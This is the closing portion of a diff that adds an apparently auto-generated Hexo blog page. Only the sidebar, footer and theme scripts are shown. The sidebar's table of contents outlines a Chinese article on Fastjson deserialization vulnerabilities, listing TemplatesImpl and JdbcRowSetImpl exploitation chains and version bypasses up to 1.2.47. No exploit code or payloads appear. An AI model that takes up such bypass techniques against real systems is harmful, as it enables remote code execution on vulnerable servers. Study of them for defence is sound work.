+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80"><span class="nav-text">Fastjson反序列化漏洞基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Fastjson%E7%AE%80%E4%BB%8B"><span class="nav-text">Fastjson简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#API%E4%BB%8B%E7%BB%8D"><span class="nav-text">API介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80"><span class="nav-text">fastjson反序列化基础</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fastjson-%E4%BD%BF%E7%94%A8"><span class="nav-text">Fastjson 使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%B0%86%E7%B1%BB%E8%BD%AC%E4%B8%BA-json"><span class="nav-text">1. 将类转为 json</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%B0%86-json-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%BA%E7%B1%BB"><span class="nav-text">2. 将 json 反序列化为类</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">Fastjson反序列化漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-text">TemplatesImpl 利用链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6"><span class="nav-text">限制条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-text">复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-text">JdbcRowSetImpl利用链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="nav-text">漏洞类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6-1"><span class="nav-text">限制条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0-1"><span class="nav-text">复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-text">分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fastjson%E7%9A%84%E6%8A%97%E4%BA%89%E5%8F%B2"><span class="nav-text">Fastjson的抗争史</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-25%E7%89%88%E6%9C%AC%E4%BF%AE%E5%A4%8D"><span class="nav-text">1.2.25版本修复</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-25-1-2-41-%E7%BB%95%E8%BF%87"><span class="nav-text">1.2.25-1.2.41 绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-42-%E7%BB%95%E8%BF%87"><span class="nav-text">1.2.42 绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-43-%E4%BF%AE%E5%A4%8D"><span class="nav-text">1.2.43 修复</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-45-%E4%BF%AE%E5%A4%8D"><span class="nav-text">1.2.45 修复</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-25-1-2-47-%E7%BB%95%E8%BF%87-%EF%BC%88%E9%80%9A%E6%9D%80"><span class="nav-text">1.2.25 - 1.2.47 绕过 （通杀</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><span class="nav-text">绕过分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-48-%E4%BF%AE%E5%A4%8D"><span class="nav-text">1.2.48 修复</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">apsry</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">apsry</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
